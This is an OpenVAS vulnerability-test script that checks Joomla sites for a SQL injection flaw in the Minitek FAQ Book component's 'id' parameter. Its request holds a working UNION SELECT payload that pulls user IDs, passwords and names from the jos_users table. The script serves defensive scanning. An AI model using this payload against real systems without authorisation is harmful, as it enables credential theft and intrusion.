##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_minitek_sql_inj_vuln.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802106");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2011-06-20 15:22:27 +0200 (Mon, 20 Jun 2011)");
  script_bugtraq_id(48223);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Joomla Minitek FAQ Book 'id' Parameter SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("joomla/installed");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44943");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/102195/joomlafaqbook-sql.txt");
  script_xref(name:"URL", value:"http://www.exploit-id.com/web-applications/joomla-component-minitek-faq-book-sql-injection");

  script_tag(name:"impact", value:"Successful exploitation will let attackers to manipulate SQL queries by
  injecting arbitrary SQL code.");

  script_tag(name:"affected", value:"Joomla Minitek FAQ Book component version 1.3");

  script_tag(name:"insight", value:"The flaw is due to input passed via the 'id' parameter to 'index.php'(when
  'option' is set to 'com_faqbook' and 'view' is set to 'category') is not properly sanitised before being used
  in a SQL query.");

  script_tag(name:"solution", value:"Upgrade to Joomla Minitek FAQ Book component version 1.4 or later.");

  script_tag(name:"summary", value:"This host is running Joomla Minitek FAQ Book component and is prone to SQL
  injection vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if (dir == "/")
  dir = "";

sndReq = http_get(item: dir + "/index.php", port: port);
rcvRes = http_keepalive_send_recv(port: port, data:sndReq);

cookie = eregmatch(pattern:"Set-Cookie: ([a-zA-Z0-9=]+).*", string:rcvRes);

if (isnull(cookie[1]))
  cookie = "bce47a007c8b2cf96f79c7a0d154a9be=399e73298f66054c1a66858050b785bf";
else
  cookie = cookie[1];

useragent = http_get_user_agent();
host = http_host_name(port:port);

sndReq = string("GET ", dir, "/index.php?option=com_faqbook&view=category" +
                "&id=-7+union+select+1,2,3,4,5,6,7,8,concat_ws(0x3a,0x4f70656e564153," +
                "id,password,0x4f70656e564153,name),10,11,12,13,14,15,16,17,18,19," +
                "20,21,22,23,24,25,26+from+jos_users--", " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Cookie: ", cookie , "; path=/", "\r\n\r\n");
rcvRes = http_keepalive_send_recv(port: port, data:sndReq);

if (egrep(string:rcvRes, pattern:"OpenVAS:[0-9]+:(.+):OpenVAS")) {
  security_message(port: port);
  exit(0);
}

exit(99);